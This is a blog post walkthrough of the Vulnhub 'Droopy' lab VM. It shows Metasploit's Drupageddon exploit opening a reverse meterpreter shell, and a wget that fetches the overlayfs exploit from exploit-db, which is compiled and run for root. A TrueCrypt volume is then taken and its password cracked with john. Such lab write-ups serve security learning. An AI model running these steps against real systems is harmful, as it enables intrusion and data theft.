
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="A few days ago, I installed a new pentesting box based on Arch Linux with Kali in a virtual machine. In order to test it I select a light vulnbox on vulnhub : Droopy. There were two hints on the description of the machine on the vulnhub download page: Grab a copy of the rockyou wordlist. It's fun to read other people's email. We will see how to use them in a moment :)" name="description"/>
<meta content="drupal, security, vulnhub, boot2root, linux" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Vulnhub Droopy" property="og:title"/>
<meta content="A few days ago, I installed a new pentesting box based on Arch Linux with Kali in a virtual machine. In order to test it I select a light vulnbox on vulnhub : Droopy. There were two hints on the description of the machine on the vulnhub download page: Grab a copy of the rockyou wordlist. It's fun to read other people's email. We will see how to use them in a moment :)" property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2016/05/vulnhub-droopy.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2016-05-10 21:49:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="drupal" property="article:tag"/>
<meta content="security" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Vulnhub Droopy</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="vulnhub-droopy">Vulnhub Droopy</h1>
<p>
      Posted on 10 May 2016 in <a href="../../category/security.html">security</a>

        • 5 min read
    </p>
</header>
<div>
<p><img alt="Droopy homepage" class="align-left" src="/media/2016.05/droopy.png" width="162"/>
A few days ago, I installed a new pentesting box based on Arch Linux with Kali</p>
<p>in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
<a href="https://www.vulnhub.com/entry/droopy-v02,143/">Droopy</a>.
There were two hints on the description of the machine on the vulnhub download
page:</p>
<ol>
<li>Grab a copy of the rockyou wordlist.</li>
<li>It's fun to read other people's email.</li>
</ol>
<p>We will see how to use them in a moment :)</p>
<h2>Discovery</h2>
<p>Our nmap scan give us nothing but an open 80 port running a HTTP server.
Let's give a look to the website:</p>
<p><img alt="Droopy homepage" class="image-process-article-image" src="/media/2016.05/derivatives/article-image/droopy.png"/></p>
<p><a href="https://www.wappalyzer.com/">Wappalyzer</a> give use the precise version of the Drupal
used (with the name and to logo of the VM it is easy to deduce that this is a
Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
also called
<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">drupal_drupageddon</a>.</p>
<h2>Exploit</h2>
<p>We use metasploit to directly have the Drupal exploit AND directly a
meterpreter:</p>
<div class="highlight"><pre><span></span><code><span class="n">msf</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">search</span><span class="w"> </span><span class="n">drupal</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Module</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">built</span><span class="w"> </span><span class="n">yet</span><span class="p">,</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">slow</span><span class="w"> </span><span class="n">search</span>

<span class="n">Matching</span><span class="w"> </span><span class="n">Modules</span>
<span class="o">================</span>

<span class="w">  </span><span class="n">Name</span><span class="w">                                           </span><span class="n">Disclosure</span><span class="w"> </span><span class="n">Date</span><span class="w">  </span><span class="n">Rank</span><span class="w">       </span><span class="n">Description</span>
<span class="w">  </span><span class="o">----</span><span class="w">                                           </span><span class="o">---------------</span><span class="w">  </span><span class="o">----</span><span class="w">       </span><span class="o">-----------</span>
<span class="w">  </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">drupal_openid_xxe</span><span class="w">             </span><span class="mi">2012</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">17</span><span class="w">       </span><span class="n">normal</span><span class="w">     </span><span class="n">Drupal</span><span class="w"> </span><span class="n">OpenID</span><span class="w"> </span><span class="n">External</span><span class="w"> </span><span class="n">Entity</span><span class="w"> </span><span class="n">Injection</span>
<span class="w">  </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">drupal_views_user_enum</span><span class="w">  </span><span class="mi">2010</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span><span class="w">       </span><span class="n">normal</span><span class="w">     </span><span class="n">Drupal</span><span class="w"> </span><span class="n">Views</span><span class="w"> </span><span class="n">Module</span><span class="w"> </span><span class="n">Users</span><span class="w"> </span><span class="n">Enumeration</span>
<span class="w">  </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">drupal_drupageddon</span><span class="w">          </span><span class="mi">2014</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">15</span><span class="w">       </span><span class="n">excellent</span><span class="w">  </span><span class="n">Drupal</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">Parameter</span><span class="w"> </span><span class="n">Key</span><span class="o">/</span><span class="n">Value</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Injection</span>
<span class="w">  </span><span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">php_xmlrpc_eval</span><span class="w">            </span><span class="mi">2005</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">29</span><span class="w">       </span><span class="n">excellent</span><span class="w">  </span><span class="n">PHP</span><span class="w"> </span><span class="n">XML</span><span class="o">-</span><span class="n">RPC</span><span class="w"> </span><span class="n">Arbitrary</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span>
</code></pre></div>
<p>We set the RHOST to the VM's IP address</p>
<div class="highlight"><pre><span></span><code>msf exploit(drupal_drupageddon) &gt; set RHOST 10.0.2.4
</code></pre></div>
<p>We check our options</p>
<div class="highlight"><pre><span></span><code>msf exploit(drupal_drupageddon) &gt; show options

Module options (exploit/multi/http/drupal_drupageddon):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST      10.0.2.4         yes       The target address
  RPORT      80               yes       The target port
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The target URI of the Drupal installation
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST  10.0.2.15        yes       The listen address
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
  --  ----
  0   Drupal 7.0 - 7.31
</code></pre></div>
<p>We launch our exploit against the server and praise for a reverse shell:
    msf exploit(drupal_drupageddon) &gt; exploit</p>
<div class="highlight"><pre><span></span><code><span class="n">Started</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mf">10.0.2.15</span><span class="o">:</span><span class="mi">4444</span>
<span class="n">Testing</span><span class="w"> </span><span class="n">page</span>
<span class="n">Creating</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">ULMihKJWdb</span><span class="o">:</span><span class="n">giXrJOFefa</span>
<span class="n">Logging</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="n">ULMihKJWdb</span><span class="o">:</span><span class="n">giXrJOFefa</span>
<span class="n">Trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nf">parse</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">modules</span>
<span class="n">Enabling</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="kr">module</span>
<span class="n">Setting</span><span class="w"> </span><span class="n">permissions</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="kr">module</span>
<span class="n">Getting</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="n">page</span>
<span class="n">Calling</span><span class="w"> </span><span class="n">preview</span><span class="w"> </span><span class="n">page</span><span class="p">.</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">trigger</span><span class="p">...</span>
<span class="n">Sending</span><span class="w"> </span><span class="n">stage</span><span class="w"> </span><span class="p">(</span><span class="mi">33721</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.0.2.4</span>
<span class="n">Meterpreter</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">opened</span><span class="w"> </span><span class="p">(</span><span class="mf">10.0.2.15</span><span class="o">:</span><span class="mi">4444</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mf">10.0.2.4</span><span class="o">:</span><span class="mi">52349</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mi">2016</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">16</span><span class="o">:</span><span class="mi">56</span><span class="o">:</span><span class="mi">46</span><span class="w"> </span><span class="o">+</span><span class="mo">0200</span>
</code></pre></div>
<h2>Second hint</h2>
<p>Okay it works, we got a meterperter with the user <code>www-data</code>, let's follow the
hint a get a look to the e-mails:</p>
<div class="highlight"><pre><span></span><code><span class="n">meterpreter</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span>
<span class="n">Listing</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span>
<span class="o">==================</span>

<span class="n">Mode</span><span class="w">              </span><span class="n">Size</span><span class="w">  </span><span class="n">Type</span><span class="w">  </span><span class="n">Last</span><span class="w"> </span><span class="n">modified</span><span class="w">              </span><span class="n">Name</span>
<span class="o">----</span><span class="w">              </span><span class="o">----</span><span class="w">  </span><span class="o">----</span><span class="w">  </span><span class="o">-------------</span><span class="w">              </span><span class="o">----</span>
<span class="mi">100777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">564</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">14</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">01</span><span class="w"> </span><span class="o">+</span><span class="mi">0200</span><span class="w">  </span><span class="n">www</span><span class="o">-</span><span class="n">data</span>
</code></pre></div>
<p>Let's read the e-mails of www-data:</p>
<div class="highlight"><pre><span></span><code><span class="k">From</span><span class="w"> </span><span class="n">Dave</span><span class="w"> </span><span class="o">&lt;</span><span class="n">dave</span><span class="nv">@droopy</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Wed</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="mi">2016</span>
<span class="nc">Date</span><span class="err">:</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
<span class="k">From</span><span class="err">:</span><span class="w"> </span><span class="n">Dave</span><span class="w"> </span><span class="o">&lt;</span><span class="n">dave</span><span class="nv">@droopy</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span>
<span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">rockyou</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">nice</span><span class="w"> </span><span class="n">hat</span><span class="err">!</span>
<span class="n">Message</span><span class="o">-</span><span class="nl">ID</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="mi">730262568</span><span class="nv">@example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span>
<span class="n">X</span><span class="o">-</span><span class="nl">IMAP</span><span class="p">:</span><span class="w"> </span><span class="mi">0080081351</span><span class="w"> </span><span class="mi">0000002016</span>
<span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="n">NN</span>

<span class="n">George</span><span class="p">,</span>

<span class="w">  </span><span class="n">I</span><span class="s1">'ve updated the encrypted file... You didn'</span><span class="n">t</span><span class="w"> </span><span class="n">leave</span><span class="w"> </span><span class="ow">any</span>
<span class="n">hints</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">me</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">isn</span><span class="s1">'t longer than 11 characters</span>
<span class="s1">and anyway, we know what academy we went to, don'</span><span class="n">t</span><span class="w"> </span><span class="n">you</span><span class="p">...</span><span class="vm">?</span>

<span class="n">I</span><span class="s1">'m sure you'</span><span class="n">ll</span><span class="w"> </span><span class="n">figure</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">won</span><span class="err">'</span><span class="n">t</span><span class="w"> </span><span class="n">rockyou</span><span class="w"> </span><span class="n">too</span><span class="w"> </span><span class="n">much</span><span class="err">!</span>

<span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="n">struggling</span><span class="p">,</span><span class="w"> </span><span class="n">remember</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">song</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Jam</span>

<span class="n">Later</span><span class="p">,</span>
<span class="n">Dave</span>
</code></pre></div>
<h2>Privilege escalation</h2>
<p>We need a privilege escalation. Like for
<a href="https://maggick.fr/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328">Fart-knocker</a>
We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
machine.</p>
<p>We spawn a shell:</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; shell
Process 1233 created.
Channel 1 created.
</code></pre></div>
<p>We still have the permissions of <code>www-data</code>:</p>
<div class="highlight"><pre><span></span><code>id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre></div>
<p>We download the exploit <code>ofs.c</code>:</p>
<div class="highlight"><pre><span></span><code><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="mi">37292</span>
<span class="o">--</span><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">12</span><span class="o">--</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="mi">37292</span>
<span class="n">Resolving</span><span class="w"> </span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">...</span><span class="w"> </span><span class="mf">192.124</span><span class="o">.</span><span class="mf">249.8</span>
<span class="n">Connecting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mf">192.124</span><span class="o">.</span><span class="mf">249.8</span><span class="o">|</span><span class="p">:</span><span class="mf">443.</span><span class="o">..</span><span class="w"> </span><span class="n">connected</span><span class="o">.</span>
<span class="n">HTTP</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">sent</span><span class="p">,</span><span class="w"> </span><span class="n">awaiting</span><span class="w"> </span><span class="n">response</span><span class="o">...</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="n">OK</span>
<span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">5123</span><span class="w"> </span><span class="p">(</span><span class="mf">5.0</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">txt</span><span class="p">]</span>
<span class="n">Saving</span><span class="w"> </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="s1">'37292'</span>

<span class="w">    </span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="o">.....</span><span class="w">                                                 </span><span class="mi">100</span><span class="o">%</span><span class="w">  </span><span class="mi">358</span><span class="n">M</span><span class="o">=</span><span class="mi">0</span><span class="n">s</span>

<span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="p">(</span><span class="mi">358</span><span class="w"> </span><span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="s1">'37292'</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="p">[</span><span class="mi">5123</span><span class="o">/</span><span class="mi">5123</span><span class="p">]</span>
</code></pre></div>
<p>We rename the file:</p>
<div class="highlight"><pre><span></span><code>mv 37292 ofs.c
</code></pre></div>
<p>We compile it and add execution permission:</p>
<div class="highlight"><pre><span></span><code>gcc ofs.c -o ofs
chmod +x ofs
</code></pre></div>
<p>Then we just run it to gain root privileges on the box:</p>
<div class="highlight"><pre><span></span><code>./ofs
collect2: error: ld returned 1 exit status
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
id
# uid=0(root) gid=0(root) groups=0(root),33(www-data)
</code></pre></div>
<p>Okay let us search for the flag:</p>
<div class="highlight"><pre><span></span><code>ls /root/
# dave.tc
</code></pre></div>
<h2>First hint</h2>
<p>It seems we have a truecrypt volume, let's download it on our machine for more
investigation:</p>
<div class="highlight"><pre><span></span><code><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">dave</span><span class="o">.</span><span class="n">tc</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span>
</code></pre></div>
<p>Then we can download it directly from the server at <code>http://10.0.2.4/dave.tc</code></p>
<p>We need to extract the hashes from the file to pass them to john, hopefully a
tool exist just for that (we need to compile it):</p>
<div class="highlight"><pre><span></span><code>http://article.gmane.org/gmane.comp.security.openwall.john.user/5320
</code></pre></div>
<p>As the mail mention the academy and the hint mention the rockyou password list,
let us just extract the academy related passwords from it:</p>
<div class="highlight"><pre><span></span><code>grep academy /media/sf_password_lists/rockyou.txt &gt; /tmp/test
</code></pre></div>
<p>We launch john against the file with our partial rockyou list:</p>
<div class="highlight"><pre><span></span><code>john dave.tc.john -w=/tmp/test
Warning: detected hash type "tc_aes_xts", but the string is also recognized as "tc_ripemd160"
Use the "--format=tc_ripemd160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])
Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy
etonacademy      (truecrypt_normal_volume)
1g 0:00:00:03 DONE (2016-05-10 17:16) 0.2724g/s 59.94p/s 331.8c/s 331.8C/s 06academy..!academy
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div>
<p>We mount the container using veracrypt:</p>
<div class="highlight"><pre><span></span><code>veracrypt dave.tc -tc
</code></pre></div>
<p>Let us do a <code>tree -a</code> to see what file we have in this container:</p>
<div class="highlight"><pre><span></span><code>.
├── buller
│   └── BullingdonCrest.jpg
├── lost+found [error opening dir]
├── panama
│   └── shares.jpg
└── .secret
    ├── piers.png
    └── .top
        └── flag.txt

5 directories, 4 files
</code></pre></div>
<h2>Conclusion</h2>
<p>Content of ./secret/.top/flag.txt</p>
<div class="highlight"><pre><span></span><code>################################################################################
#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
#                                                                              #
################################################################################

Firstly, thanks for trying this VM. If you have rooted it, well done!

Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
goes to barrebas and junken for help in testing and final configuration.
                                                                --knightmare
</code></pre></div>
<p>It was a nice challenge, mainly for the beginner, probably a lack in the web
part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
injection manually).</p>
<p>Thanks to knightmare for the VM and as always thanks to vulnhub !</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/drupal.html">drupal</a>
<a href="../../tag/security.html">security</a>
<a href="../../tag/vulnhub.html">vulnhub</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/linux.html">linux</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2016/04/installing-osmc-without-installer.html" title="Installing OSMC without installer">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2016/05/vulnhub-sectalks-bne0x03-simple.html" title="Vulnhub SecTalks: BNE0x03 - Simple">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2023  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>